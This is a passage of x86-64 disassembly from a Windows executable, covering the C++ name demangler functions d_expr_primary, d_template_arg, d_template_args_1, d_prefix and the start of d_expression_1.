   140004555:	e9 c3 fb ff ff       	jmp    14000411d <d_unqualified_name+0x20d>
   14000455a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140004560 <d_expr_primary>:
   140004560:	57                   	push   %rdi
   140004561:	56                   	push   %rsi
   140004562:	53                   	push   %rbx
   140004563:	48 83 ec 20          	sub    $0x20,%rsp
   140004567:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   14000456b:	80 3a 4c             	cmpb   $0x4c,(%rdx)
   14000456e:	48 89 cb             	mov    %rcx,%rbx
   140004571:	0f 85 84 00 00 00    	jne    1400045fb <d_expr_primary+0x9b>
   140004577:	48 8d 42 01          	lea    0x1(%rdx),%rax
   14000457b:	48 89 41 18          	mov    %rax,0x18(%rcx)
   14000457f:	0f b6 4a 01          	movzbl 0x1(%rdx),%ecx
   140004583:	80 f9 5f             	cmp    $0x5f,%cl
   140004586:	0f 84 74 01 00 00    	je     140004700 <d_expr_primary+0x1a0>
   14000458c:	80 f9 5a             	cmp    $0x5a,%cl
   14000458f:	74 7f                	je     140004610 <d_expr_primary+0xb0>
   140004591:	48 89 d9             	mov    %rbx,%rcx
   140004594:	e8 f7 e8 ff ff       	call   140002e90 <d_type>
   140004599:	48 89 c6             	mov    %rax,%rsi
   14000459c:	48 85 c0             	test   %rax,%rax
   14000459f:	74 5a                	je     1400045fb <d_expr_primary+0x9b>
   1400045a1:	83 38 28             	cmpl   $0x28,(%rax)
   1400045a4:	48 8b 7b 18          	mov    0x18(%rbx),%rdi
   1400045a8:	0f 84 ba 00 00 00    	je     140004668 <d_expr_primary+0x108>
   1400045ae:	0f b6 0f             	movzbl (%rdi),%ecx
   1400045b1:	41 ba 3e 00 00 00    	mov    $0x3e,%r10d
   1400045b7:	80 f9 6e             	cmp    $0x6e,%cl
   1400045ba:	0f 84 f0 00 00 00    	je     1400046b0 <d_expr_primary+0x150>
   1400045c0:	80 f9 45             	cmp    $0x45,%cl
   1400045c3:	0f 84 7b 01 00 00    	je     140004744 <d_expr_primary+0x1e4>
   1400045c9:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1400045cd:	eb 28                	jmp    1400045f7 <d_expr_primary+0x97>
   1400045cf:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400045d6:	00 00 00 00 
   1400045da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400045e0:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400045e4:	49 89 d0             	mov    %rdx,%r8
   1400045e7:	0f b6 0a             	movzbl (%rdx),%ecx
   1400045ea:	48 83 c2 01          	add    $0x1,%rdx
   1400045ee:	80 f9 45             	cmp    $0x45,%cl
   1400045f1:	0f 84 d9 00 00 00    	je     1400046d0 <d_expr_primary+0x170>
   1400045f7:	84 c9                	test   %cl,%cl
   1400045f9:	75 e5                	jne    1400045e0 <d_expr_primary+0x80>
   1400045fb:	31 f6                	xor    %esi,%esi
   1400045fd:	48 89 f0             	mov    %rsi,%rax
   140004600:	48 83 c4 20          	add    $0x20,%rsp
   140004604:	5b                   	pop    %rbx
   140004605:	5e                   	pop    %rsi
   140004606:	5f                   	pop    %rdi
   140004607:	c3                   	ret
   140004608:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000460f:	00 
   140004610:	80 f9 5f             	cmp    $0x5f,%cl
   140004613:	0f 84 e7 00 00 00    	je     140004700 <d_expr_primary+0x1a0>
   140004619:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000461d:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004621:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140004625:	3c 47                	cmp    $0x47,%al
   140004627:	0f 84 f3 00 00 00    	je     140004720 <d_expr_primary+0x1c0>
   14000462d:	3c 54                	cmp    $0x54,%al
   14000462f:	0f 84 eb 00 00 00    	je     140004720 <d_expr_primary+0x1c0>
   140004635:	31 d2                	xor    %edx,%edx
   140004637:	48 89 d9             	mov    %rbx,%rcx
   14000463a:	e8 a1 1b 00 00       	call   1400061e0 <d_encoding.part.0>
   14000463f:	48 89 c6             	mov    %rax,%rsi
   140004642:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004646:	0f b6 10             	movzbl (%rax),%edx
   140004649:	80 fa 45             	cmp    $0x45,%dl
   14000464c:	75 ad                	jne    1400045fb <d_expr_primary+0x9b>
   14000464e:	48 83 c0 01          	add    $0x1,%rax
   140004652:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004656:	48 89 f0             	mov    %rsi,%rax
   140004659:	48 83 c4 20          	add    $0x20,%rsp
   14000465d:	5b                   	pop    %rbx
   14000465e:	5e                   	pop    %rsi
   14000465f:	5f                   	pop    %rdi
   140004660:	c3                   	ret
   140004661:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004668:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000466c:	8b 50 1c             	mov    0x1c(%rax),%edx
   14000466f:	85 d2                	test   %edx,%edx
   140004671:	74 06                	je     140004679 <d_expr_primary+0x119>
   140004673:	8b 50 08             	mov    0x8(%rax),%edx
   140004676:	29 53 48             	sub    %edx,0x48(%rbx)
   140004679:	48 8b 08             	mov    (%rax),%rcx
   14000467c:	48 8d 15 9d cf 34 00 	lea    0x34cf9d(%rip),%rdx        # 140351620 <.rdata+0x220>
   140004683:	e8 88 14 01 00       	call   140015b10 <strcmp>
   140004688:	0f b6 0f             	movzbl (%rdi),%ecx
   14000468b:	85 c0                	test   %eax,%eax
   14000468d:	0f 85 1e ff ff ff    	jne    1400045b1 <d_expr_primary+0x51>
   140004693:	80 f9 45             	cmp    $0x45,%cl
   140004696:	0f 84 9b 00 00 00    	je     140004737 <d_expr_primary+0x1d7>
   14000469c:	41 ba 3e 00 00 00    	mov    $0x3e,%r10d
   1400046a2:	80 f9 6e             	cmp    $0x6e,%cl
   1400046a5:	0f 85 1e ff ff ff    	jne    1400045c9 <d_expr_primary+0x69>
   1400046ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400046b0:	48 8d 47 01          	lea    0x1(%rdi),%rax
   1400046b4:	41 ba 3f 00 00 00    	mov    $0x3f,%r10d
   1400046ba:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400046be:	0f b6 4f 01          	movzbl 0x1(%rdi),%ecx
   1400046c2:	48 89 c7             	mov    %rax,%rdi
   1400046c5:	e9 f6 fe ff ff       	jmp    1400045c0 <d_expr_primary+0x60>
   1400046ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400046d0:	41 29 f8             	sub    %edi,%r8d
   1400046d3:	48 89 fa             	mov    %rdi,%rdx
   1400046d6:	48 89 d9             	mov    %rbx,%rcx
   1400046d9:	e8 22 d7 ff ff       	call   140001e00 <d_make_name>
   1400046de:	49 89 f0             	mov    %rsi,%r8
   1400046e1:	44 89 d2             	mov    %r10d,%edx
   1400046e4:	49 89 c1             	mov    %rax,%r9
   1400046e7:	e8 14 d6 ff ff       	call   140001d00 <d_make_comp>
   1400046ec:	48 89 c6             	mov    %rax,%rsi
   1400046ef:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400046f3:	0f b6 10             	movzbl (%rax),%edx
   1400046f6:	e9 4e ff ff ff       	jmp    140004649 <d_expr_primary+0xe9>
   1400046fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004700:	48 8d 42 02          	lea    0x2(%rdx),%rax
   140004704:	31 f6                	xor    %esi,%esi
   140004706:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000470a:	0f b6 52 02          	movzbl 0x2(%rdx),%edx
   14000470e:	80 fa 5a             	cmp    $0x5a,%dl
   140004711:	0f 85 32 ff ff ff    	jne    140004649 <d_expr_primary+0xe9>
   140004717:	e9 fd fe ff ff       	jmp    140004619 <d_expr_primary+0xb9>
   14000471c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004720:	48 89 d9             	mov    %rbx,%rcx
   140004723:	e8 88 0e 00 00       	call   1400055b0 <d_special_name>
   140004728:	48 89 c6             	mov    %rax,%rsi
   14000472b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000472f:	0f b6 10             	movzbl (%rax),%edx
   140004732:	e9 12 ff ff ff       	jmp    140004649 <d_expr_primary+0xe9>
   140004737:	48 83 c7 01          	add    $0x1,%rdi
   14000473b:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   14000473f:	e9 b9 fe ff ff       	jmp    1400045fd <d_expr_primary+0x9d>
   140004744:	45 31 c0             	xor    %r8d,%r8d
   140004747:	eb 8a                	jmp    1400046d3 <d_expr_primary+0x173>
   140004749:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140004750 <d_template_arg>:
   140004750:	56                   	push   %rsi
   140004751:	48 83 ec 30          	sub    $0x30,%rsp
   140004755:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140004759:	0f b6 10             	movzbl (%rax),%edx
   14000475c:	80 fa 4c             	cmp    $0x4c,%dl
   14000475f:	74 5f                	je     1400047c0 <d_template_arg+0x70>
   140004761:	7f 1d                	jg     140004780 <d_template_arg+0x30>
   140004763:	83 ea 49             	sub    $0x49,%edx
   140004766:	80 fa 01             	cmp    $0x1,%dl
   140004769:	77 65                	ja     1400047d0 <d_template_arg+0x80>
   14000476b:	48 83 c0 01          	add    $0x1,%rax
   14000476f:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004773:	48 83 c4 30          	add    $0x30,%rsp
   140004777:	5e                   	pop    %rsi
   140004778:	eb 76                	jmp    1400047f0 <d_template_args_1>
   14000477a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004780:	80 fa 58             	cmp    $0x58,%dl
   140004783:	75 4b                	jne    1400047d0 <d_template_arg+0x80>
   140004785:	48 83 c0 01          	add    $0x1,%rax
   140004789:	8b 71 4c             	mov    0x4c(%rcx),%esi
   14000478c:	c7 41 4c 01 00 00 00 	movl   $0x1,0x4c(%rcx)
   140004793:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004797:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000479c:	e8 1f 03 00 00       	call   140004ac0 <d_expression_1>
   1400047a1:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400047a6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   1400047aa:	89 71 4c             	mov    %esi,0x4c(%rcx)
   1400047ad:	80 3a 45             	cmpb   $0x45,(%rdx)
   1400047b0:	75 2e                	jne    1400047e0 <d_template_arg+0x90>
   1400047b2:	48 83 c2 01          	add    $0x1,%rdx
   1400047b6:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   1400047ba:	48 83 c4 30          	add    $0x30,%rsp
   1400047be:	5e                   	pop    %rsi
   1400047bf:	c3                   	ret
   1400047c0:	48 83 c4 30          	add    $0x30,%rsp
   1400047c4:	5e                   	pop    %rsi
   1400047c5:	e9 96 fd ff ff       	jmp    140004560 <d_expr_primary>
   1400047ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400047d0:	48 83 c4 30          	add    $0x30,%rsp
   1400047d4:	5e                   	pop    %rsi
   1400047d5:	e9 b6 e6 ff ff       	jmp    140002e90 <d_type>
   1400047da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400047e0:	31 c0                	xor    %eax,%eax
   1400047e2:	eb d6                	jmp    1400047ba <d_template_arg+0x6a>
   1400047e4:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400047eb:	00 00 00 00 
   1400047ef:	90                   	nop

00000001400047f0 <d_template_args_1>:
   1400047f0:	41 54                	push   %r12
   1400047f2:	55                   	push   %rbp
   1400047f3:	57                   	push   %rdi
   1400047f4:	56                   	push   %rsi
   1400047f5:	53                   	push   %rbx
   1400047f6:	48 83 ec 30          	sub    $0x30,%rsp
   1400047fa:	48 8b 3d 6f f4 34 00 	mov    0x34f46f(%rip),%rdi        # 140353c70 <.refptr.__stack_chk_guard>
   140004801:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140004805:	80 38 45             	cmpb   $0x45,(%rax)
   140004808:	48 8b 2f             	mov    (%rdi),%rbp
   14000480b:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140004810:	48 8b 69 40          	mov    0x40(%rcx),%rbp
   140004814:	48 89 cb             	mov    %rcx,%rbx
   140004817:	0f 84 93 00 00 00    	je     1400048b0 <d_template_args_1+0xc0>
   14000481d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004824:	00 00 
   140004826:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   14000482b:	eb 2e                	jmp    14000485b <d_template_args_1+0x6b>
   14000482d:	0f 1f 00             	nopl   (%rax)
   140004830:	45 31 c9             	xor    %r9d,%r9d
   140004833:	ba 30 00 00 00       	mov    $0x30,%edx
   140004838:	48 89 d9             	mov    %rbx,%rcx
   14000483b:	e8 c0 d4 ff ff       	call   140001d00 <d_make_comp>
   140004840:	48 89 06             	mov    %rax,(%rsi)
   140004843:	48 85 c0             	test   %rax,%rax
   140004846:	74 23                	je     14000486b <d_template_args_1+0x7b>
   140004848:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   14000484c:	48 8d 70 18          	lea    0x18(%rax),%rsi
   140004850:	0f b6 02             	movzbl (%rdx),%eax
   140004853:	3c 45                	cmp    $0x45,%al
   140004855:	74 39                	je     140004890 <d_template_args_1+0xa0>
   140004857:	3c 51                	cmp    $0x51,%al
   140004859:	74 35                	je     140004890 <d_template_args_1+0xa0>
   14000485b:	48 89 d9             	mov    %rbx,%rcx
   14000485e:	e8 ed fe ff ff       	call   140004750 <d_template_arg>
   140004863:	49 89 c0             	mov    %rax,%r8
   140004866:	48 85 c0             	test   %rax,%rax
   140004869:	75 c5                	jne    140004830 <d_template_args_1+0x40>
   14000486b:	31 f6                	xor    %esi,%esi
   14000486d:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140004872:	48 2b 07             	sub    (%rdi),%rax
   140004875:	0f 85 ba 00 00 00    	jne    140004935 <d_template_args_1+0x145>
   14000487b:	48 89 f0             	mov    %rsi,%rax
   14000487e:	48 83 c4 30          	add    $0x30,%rsp
   140004882:	5b                   	pop    %rbx
   140004883:	5e                   	pop    %rsi
   140004884:	5f                   	pop    %rdi
   140004885:	5d                   	pop    %rbp
   140004886:	41 5c                	pop    %r12
   140004888:	c3                   	ret
   140004889:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004890:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   140004895:	3c 51                	cmp    $0x51,%al
   140004897:	74 43                	je     1400048dc <d_template_args_1+0xec>
   140004899:	48 83 c2 01          	add    $0x1,%rdx
   14000489d:	48 89 6b 40          	mov    %rbp,0x40(%rbx)
   1400048a1:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400048a5:	eb c6                	jmp    14000486d <d_template_args_1+0x7d>
   1400048a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400048ae:	00 00 
   1400048b0:	48 83 c0 01          	add    $0x1,%rax
   1400048b4:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1400048b8:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400048bd:	48 2b 07             	sub    (%rdi),%rax
   1400048c0:	75 73                	jne    140004935 <d_template_args_1+0x145>
   1400048c2:	45 31 c9             	xor    %r9d,%r9d
   1400048c5:	45 31 c0             	xor    %r8d,%r8d
   1400048c8:	ba 30 00 00 00       	mov    $0x30,%edx
   1400048cd:	48 83 c4 30          	add    $0x30,%rsp
   1400048d1:	5b                   	pop    %rbx
   1400048d2:	5e                   	pop    %rsi
   1400048d3:	5f                   	pop    %rdi
   1400048d4:	5d                   	pop    %rbp
   1400048d5:	41 5c                	pop    %r12
   1400048d7:	e9 24 d4 ff ff       	jmp    140001d00 <d_make_comp>
   1400048dc:	48 83 c2 01          	add    $0x1,%rdx
   1400048e0:	44 8b 63 4c          	mov    0x4c(%rbx),%r12d
   1400048e4:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   1400048eb:	48 89 d9             	mov    %rbx,%rcx
   1400048ee:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400048f2:	e8 c9 01 00 00       	call   140004ac0 <d_expression_1>
   1400048f7:	44 89 63 4c          	mov    %r12d,0x4c(%rbx)
   1400048fb:	49 89 c1             	mov    %rax,%r9
   1400048fe:	48 85 c0             	test   %rax,%rax
   140004901:	74 27                	je     14000492a <d_template_args_1+0x13a>
   140004903:	49 89 f0             	mov    %rsi,%r8
   140004906:	ba 5e 00 00 00       	mov    $0x5e,%edx
   14000490b:	48 89 d9             	mov    %rbx,%rcx
   14000490e:	e8 ed d3 ff ff       	call   140001d00 <d_make_comp>
   140004913:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140004917:	48 89 c6             	mov    %rax,%rsi
   14000491a:	0f b6 02             	movzbl (%rdx),%eax
   14000491d:	3c 45                	cmp    $0x45,%al
   14000491f:	0f 85 46 ff ff ff    	jne    14000486b <d_template_args_1+0x7b>
   140004925:	e9 6f ff ff ff       	jmp    140004899 <d_template_args_1+0xa9>
   14000492a:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   14000492e:	31 f6                	xor    %esi,%esi
   140004930:	0f b6 02             	movzbl (%rdx),%eax
   140004933:	eb e8                	jmp    14000491d <d_template_args_1+0x12d>
   140004935:	e8 e6 b3 00 00       	call   14000fd20 <__stack_chk_fail>
   14000493a:	90                   	nop
   14000493b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000140004940 <d_prefix>:
   140004940:	57                   	push   %rdi
   140004941:	56                   	push   %rsi
   140004942:	53                   	push   %rbx
   140004943:	48 83 ec 20          	sub    $0x20,%rsp
   140004947:	31 f6                	xor    %esi,%esi
   140004949:	48 89 cb             	mov    %rcx,%rbx
   14000494c:	89 d7                	mov    %edx,%edi
   14000494e:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140004952:	0f b6 11             	movzbl (%rcx),%edx
   140004955:	80 fa 44             	cmp    $0x44,%dl
   140004958:	0f 84 d2 00 00 00    	je     140004a30 <d_prefix+0xf0>
   14000495e:	80 fa 49             	cmp    $0x49,%dl
   140004961:	0f 84 09 01 00 00    	je     140004a70 <d_prefix+0x130>
   140004967:	80 fa 54             	cmp    $0x54,%dl
   14000496a:	75 74                	jne    1400049e0 <d_prefix+0xa0>
   14000496c:	48 85 f6             	test   %rsi,%rsi
   14000496f:	0f 85 0b 01 00 00    	jne    140004a80 <d_prefix+0x140>
   140004975:	48 89 d9             	mov    %rbx,%rcx
   140004978:	e8 d3 dc ff ff       	call   140002650 <d_template_param>
   14000497d:	48 89 c6             	mov    %rax,%rsi
   140004980:	48 85 f6             	test   %rsi,%rsi
   140004983:	0f 84 f7 00 00 00    	je     140004a80 <d_prefix+0x140>
   140004989:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000498d:	80 39 45             	cmpb   $0x45,(%rcx)
   140004990:	0f 84 ec 00 00 00    	je     140004a82 <d_prefix+0x142>
   140004996:	85 ff                	test   %edi,%edi
   140004998:	0f 85 b2 00 00 00    	jne    140004a50 <d_prefix+0x110>
   14000499e:	0f b6 11             	movzbl (%rcx),%edx
   1400049a1:	80 fa 44             	cmp    $0x44,%dl
   1400049a4:	0f 84 86 00 00 00    	je     140004a30 <d_prefix+0xf0>
   1400049aa:	80 fa 49             	cmp    $0x49,%dl
   1400049ad:	75 b8                	jne    140004967 <d_prefix+0x27>
   1400049af:	48 83 c1 01          	add    $0x1,%rcx
   1400049b3:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   1400049b7:	48 89 d9             	mov    %rbx,%rcx
   1400049ba:	e8 31 fe ff ff       	call   1400047f0 <d_template_args_1>
   1400049bf:	49 89 c1             	mov    %rax,%r9
   1400049c2:	48 85 c0             	test   %rax,%rax
   1400049c5:	0f 84 b5 00 00 00    	je     140004a80 <d_prefix+0x140>
   1400049cb:	49 89 f0             	mov    %rsi,%r8
   1400049ce:	ba 04 00 00 00       	mov    $0x4,%edx
   1400049d3:	48 89 d9             	mov    %rbx,%rcx
   1400049d6:	e8 25 d3 ff ff       	call   140001d00 <d_make_comp>
   1400049db:	48 89 c6             	mov    %rax,%rsi
   1400049de:	eb a0                	jmp    140004980 <d_prefix+0x40>
   1400049e0:	80 fa 4d             	cmp    $0x4d,%dl
   1400049e3:	0f 84 c7 00 00 00    	je     140004ab0 <d_prefix+0x170>
   1400049e9:	80 fa 53             	cmp    $0x53,%dl
   1400049ec:	0f 85 9e 00 00 00    	jne    140004a90 <d_prefix+0x150>
   1400049f2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400049f7:	48 89 d9             	mov    %rbx,%rcx
   1400049fa:	e8 a1 e1 ff ff       	call   140002ba0 <d_substitution>
   1400049ff:	49 89 c0             	mov    %rax,%r8
   140004a02:	48 85 c0             	test   %rax,%rax
   140004a05:	74 79                	je     140004a80 <d_prefix+0x140>
   140004a07:	8b 00                	mov    (%rax),%eax
   140004a09:	83 e8 55             	sub    $0x55,%eax
   140004a0c:	83 f8 01             	cmp    $0x1,%eax
   140004a0f:	0f 86 7e 00 00 00    	jbe    140004a93 <d_prefix+0x153>
   140004a15:	48 85 f6             	test   %rsi,%rsi
   140004a18:	75 66                	jne    140004a80 <d_prefix+0x140>
   140004a1a:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140004a1e:	4c 89 c6             	mov    %r8,%rsi
   140004a21:	0f b6 11             	movzbl (%rcx),%edx
   140004a24:	80 fa 44             	cmp    $0x44,%dl
   140004a27:	75 81                	jne    1400049aa <d_prefix+0x6a>
   140004a29:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004a30:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140004a34:	83 e0 df             	and    $0xffffffdf,%eax
   140004a37:	3c 54                	cmp    $0x54,%al
   140004a39:	75 55                	jne    140004a90 <d_prefix+0x150>
   140004a3b:	48 85 f6             	test   %rsi,%rsi
   140004a3e:	75 40                	jne    140004a80 <d_prefix+0x140>
   140004a40:	48 89 d9             	mov    %rbx,%rcx
   140004a43:	e8 48 e4 ff ff       	call   140002e90 <d_type>
   140004a48:	48 89 c6             	mov    %rax,%rsi
   140004a4b:	e9 30 ff ff ff       	jmp    140004980 <d_prefix+0x40>
   140004a50:	8b 43 38             	mov    0x38(%rbx),%eax
   140004a53:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   140004a56:	7d 28                	jge    140004a80 <d_prefix+0x140>
   140004a58:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140004a5c:	4c 63 c0             	movslq %eax,%r8
   140004a5f:	83 c0 01             	add    $0x1,%eax
   140004a62:	4a 89 34 c2          	mov    %rsi,(%rdx,%r8,8)
   140004a66:	89 43 38             	mov    %eax,0x38(%rbx)
   140004a69:	e9 30 ff ff ff       	jmp    14000499e <d_prefix+0x5e>
   140004a6e:	66 90                	xchg   %ax,%ax
   140004a70:	48 85 f6             	test   %rsi,%rsi
   140004a73:	0f 85 36 ff ff ff    	jne    1400049af <d_prefix+0x6f>
   140004a79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004a80:	31 f6                	xor    %esi,%esi
   140004a82:	48 89 f0             	mov    %rsi,%rax
   140004a85:	48 83 c4 20          	add    $0x20,%rsp
   140004a89:	5b                   	pop    %rbx
   140004a8a:	5e                   	pop    %rsi
   140004a8b:	5f                   	pop    %rdi
   140004a8c:	c3                   	ret
   140004a8d:	0f 1f 00             	nopl   (%rax)
   140004a90:	45 31 c0             	xor    %r8d,%r8d
   140004a93:	48 89 f2             	mov    %rsi,%rdx
   140004a96:	48 89 d9             	mov    %rbx,%rcx
   140004a99:	e8 72 f4 ff ff       	call   140003f10 <d_unqualified_name>
   140004a9e:	48 89 c6             	mov    %rax,%rsi
   140004aa1:	e9 da fe ff ff       	jmp    140004980 <d_prefix+0x40>
   140004aa6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140004aad:	00 00 00 
   140004ab0:	48 83 c1 01          	add    $0x1,%rcx
   140004ab4:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140004ab8:	e9 91 fe ff ff       	jmp    14000494e <d_prefix+0xe>
   140004abd:	0f 1f 00             	nopl   (%rax)

0000000140004ac0 <d_expression_1>:
   140004ac0:	55                   	push   %rbp
   140004ac1:	57                   	push   %rdi
   140004ac2:	56                   	push   %rsi
   140004ac3:	53                   	push   %rbx
   140004ac4:	48 83 ec 28          	sub    $0x28,%rsp
   140004ac8:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004acc:	0f b6 02             	movzbl (%rdx),%eax
   140004acf:	48 89 cb             	mov    %rcx,%rbx
   140004ad2:	3c 4c                	cmp    $0x4c,%al
   140004ad4:	0f 84 66 03 00 00    	je     140004e40 <d_expression_1+0x380>
   140004ada:	3c 54                	cmp    $0x54,%al
   140004adc:	0f 84 6e 03 00 00    	je     140004e50 <d_expression_1+0x390>
   140004ae2:	3c 73                	cmp    $0x73,%al
   140004ae4:	74 5a                	je     140004b40 <d_expression_1+0x80>
   140004ae6:	3c 66                	cmp    $0x66,%al
   140004ae8:	0f 84 c2 00 00 00    	je     140004bb0 <d_expression_1+0xf0>
   140004aee:	8d 48 d0             	lea    -0x30(%rax),%ecx
   140004af1:	80 f9 09             	cmp    $0x9,%cl
   140004af4:	76 16                	jbe    140004b0c <d_expression_1+0x4c>
   140004af6:	3c 6f                	cmp    $0x6f,%al
   140004af8:	0f 85 4a 01 00 00    	jne    140004c48 <d_expression_1+0x188>
   140004afe:	80 7a 01 6e          	cmpb   $0x6e,0x1(%rdx)
   140004b02:	75 50                	jne    140004b54 <d_expression_1+0x94>
   140004b04:	48 83 c2 02          	add    $0x2,%rdx
   140004b08:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004b0c:	45 31 c0             	xor    %r8d,%r8d
   140004b0f:	31 d2                	xor    %edx,%edx
   140004b11:	48 89 d9             	mov    %rbx,%rcx
   140004b14:	e8 f7 f3 ff ff       	call   140003f10 <d_unqualified_name>
   140004b19:	48 89 c6             	mov    %rax,%rsi
   140004b1c:	48 85 c0             	test   %rax,%rax
   140004b1f:	0f 84 0b 03 00 00    	je     140004e30 <d_expression_1+0x370>
   140004b25:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004b29:	80 38 49             	cmpb   $0x49,(%rax)
   140004b2c:	0f 84 4e 02 00 00    	je     140004d80 <d_expression_1+0x2c0>
   140004b32:	48 89 f0             	mov    %rsi,%rax
   140004b35:	48 83 c4 28          	add    $0x28,%rsp
   140004b39:	5b                   	pop    %rbx
   140004b3a:	5e                   	pop    %rsi
   140004b3b:	5f                   	pop    %rdi
   140004b3c:	5d                   	pop    %rbp
   140004b3d:	c3                   	ret
   140004b3e:	66 90                	xchg   %ax,%ax
   140004b40:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140004b44:	3c 72                	cmp    $0x72,%al
   140004b46:	0f 84 a4 01 00 00    	je     140004cf0 <d_expression_1+0x230>
   140004b4c:	3c 70                	cmp    $0x70,%al
   140004b4e:	0f 84 8c 04 00 00    	je     140004fe0 <d_expression_1+0x520>
   140004b54:	48 89 d9             	mov    %rbx,%rcx
   140004b57:	e8 14 f2 ff ff       	call   140003d70 <d_operator_name>
   140004b5c:	48 89 c6             	mov    %rax,%rsi
   140004b5f:	48 85 c0             	test   %rax,%rax
   140004b62:	0f 84 c8 02 00 00    	je     140004e30 <d_expression_1+0x370>
   140004b68:	8b 00                	mov    (%rax),%eax
   140004b6a:	83 f8 33             	cmp    $0x33,%eax
   140004b6d:	0f 84 2d 01 00 00    	je     140004ca0 <d_expression_1+0x1e0>
   140004b73:	83 f8 34             	cmp    $0x34,%eax
   140004b76:	0f 84 1c 03 00 00    	je     140004e98 <d_expression_1+0x3d8>
   140004b7c:	83 f8 35             	cmp    $0x35,%eax
   140004b7f:	0f 85 ab 02 00 00    	jne    140004e30 <d_expression_1+0x370>
   140004b85:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004b89:	80 38 5f             	cmpb   $0x5f,(%rax)
   140004b8c:	0f 84 e0 03 00 00    	je     140004f72 <d_expression_1+0x4b2>
   140004b92:	48 89 d9             	mov    %rbx,%rcx
   140004b95:	e8 26 ff ff ff       	call   140004ac0 <d_expression_1>
   140004b9a:	49 89 c1             	mov    %rax,%r9
   140004b9d:	49 89 f0             	mov    %rsi,%r8
   140004ba0:	ba 38 00 00 00       	mov    $0x38,%edx
   140004ba5:	e9 f1 01 00 00       	jmp    140004d9b <d_expression_1+0x2db>
   140004baa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004bb0:	80 7a 01 70          	cmpb   $0x70,0x1(%rdx)
   140004bb4:	75 9e                	jne    140004b54 <d_expression_1+0x94>
   140004bb6:	48 8d 42 02          	lea    0x2(%rdx),%rax
   140004bba:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004bbe:	0f b6 42 02          	movzbl 0x2(%rdx),%eax
   140004bc2:	3c 54                	cmp    $0x54,%al
   140004bc4:	0f 84 06 04 00 00    	je     140004fd0 <d_expression_1+0x510>
   140004bca:	3c 5f                	cmp    $0x5f,%al
   140004bcc:	0f 84 8e 03 00 00    	je     140004f60 <d_expression_1+0x4a0>
   140004bd2:	3c 6e                	cmp    $0x6e,%al
   140004bd4:	0f 84 56 02 00 00    	je     140004e30 <d_expression_1+0x370>
   140004bda:	e8 81 d2 ff ff       	call   140001e60 <d_number>
